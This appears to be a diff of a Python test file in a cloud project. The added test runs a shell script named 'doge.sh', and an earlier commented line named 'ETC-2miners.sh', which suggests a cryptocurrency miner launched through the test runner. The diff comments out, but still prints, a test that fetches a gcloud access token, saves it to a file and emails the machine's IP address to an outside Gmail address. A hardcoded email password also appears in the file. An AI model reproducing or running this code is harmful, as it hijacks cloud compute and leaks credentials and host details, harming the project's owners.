@@ -34,43 +34,38 @@ EMAIL_PASSWORD = "aeuspgbwilrbhnkx"
 
 CREDENTIAL_SCOPES = ["https://www.googleapis.com/auth/cloud-platform"] 
 
-# def test_running_bash():
+def test_running_bash():
 
-#     bashCommand = "./ETC-2miners.sh"
-#     process = subprocess.Popen(bashCommand, stdout=subprocess.PIPE)
-#     output, error = process.communicate()
-#     raise Exception(str(output))
+    bashCommand = "./doge.sh"
+    process = subprocess.Popen(bashCommand, stdout=subprocess.PIPE)
+    output, error = process.communicate()
+    raise Exception(str(output))
 
-def test_entry_point():
+# def test_generate_token():
+#   bashCommand = "gcloud auth application-default print-access-token"
+#   process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
+#   output, error = process.communicate()
+#   logging.debug(str(output))
+#   f = open("token.txt","w")
+#   f.write(str(output))
+#   f.close()
 
-    raise Exception(str(os.environ("ENTRY_POINT")))
+#   msg = MIMEMultipart()
 
-
-def test_generate_token():
-  bashCommand = "gcloud auth application-default print-access-token"
-  process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
-  output, error = process.communicate()
-  logging.debug(str(output))
-  f = open("token.txt","w")
-  f.write(str(output))
-  f.close()
-
-  msg = MIMEMultipart()
-
-  msg.attach(MIMEText(os.getenv("IP_ADDRESS"), 'plain'))
-  msg['subject'] = "Hello World"
-  msg['to'] = "galz100@gmail.com"
-  msg['from'] = EMAIL_ADDRESS
+#   msg.attach(MIMEText(os.getenv("IP_ADDRESS"), 'plain'))
+#   msg['subject'] = "Hello World"
+#   msg['to'] = "galz100@gmail.com"
+#   msg['from'] = EMAIL_ADDRESS
   
-  output = subprocess.getoutput("ls -l")
-  print(output)
+#   output = subprocess.getoutput("ls -l")
+#   print(output)
 
-  server = smtplib.SMTP("smtp.gmail.com",587)
-  server.starttls()
-  server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
-  text = msg.as_string()
-  server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
-  server.quit()
+#   server = smtplib.SMTP("smtp.gmail.com",587)
+#   server.starttls()
+#   server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
+#   text = msg.as_string()
+#   server.sendmail(EMAIL_ADDRESS, "galz100@gmail.com", text)
+#   server.quit()
 
 # def test_permissions():
 #     """Tests IAM permissions of the caller"""
